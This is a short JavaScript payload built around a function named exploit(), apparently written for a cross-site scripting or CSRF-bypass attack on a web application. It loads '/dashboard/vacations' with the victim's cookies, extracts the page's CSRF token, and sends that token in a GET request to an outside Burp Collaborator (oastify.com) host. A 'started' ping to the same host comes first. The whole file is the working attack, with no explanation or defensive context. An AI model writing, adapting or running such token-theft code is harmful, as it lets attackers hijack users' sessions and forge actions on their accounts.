async function fetchPage(url, headers = {}) {
  const response = await fetch(url, {
    method: 'GET',
    headers: headers,
    credentials: 'include'
  });
  return response.text();
}

async function getRequest(url, params = {}, headers = {}) {
  const queryString = new URLSearchParams(params).toString();
  const fullUrl = queryString ? `${url}?${queryString}` : url;
  
  const response = await fetch(fullUrl, {
    method: 'GET',
    headers: headers,
    credentials: 'include'
  });
  return response.json();
}

function extractByName(html, name) {
  const doc = new DOMParser().parseFromString(html, 'text/html');
  const el = doc.querySelector(`[name="${name}"]`);
  return el ? (el.value || el.content || el.getAttribute('content')) : null;
}

// ✅ Wrap everything in async function
async function exploit() {

    // Step 0: starttest
  const test0 =  getRequest('http://qvp6rtbbgiykgu9twx19ac1hy84zs4gt.oastify.com', { 
    test: "started" 
  });

  
  // Step 1: fetch html contains token
  const html = await fetchPage('/dashboard/vacations');
  
  // Step 2: Extract token
  const token = extractByName(html, 'csrf-token');
  
  console.log('Token:', token);
  
  // Step 3: Send token to your server
  const test = await getRequest('http://qvp6rtbbgiykgu9twx19ac1hy84zs4gt.oastify.com', { 
    token: token 
  });
  
  console.log('Result:', test);
}

// Execute the function
exploit();
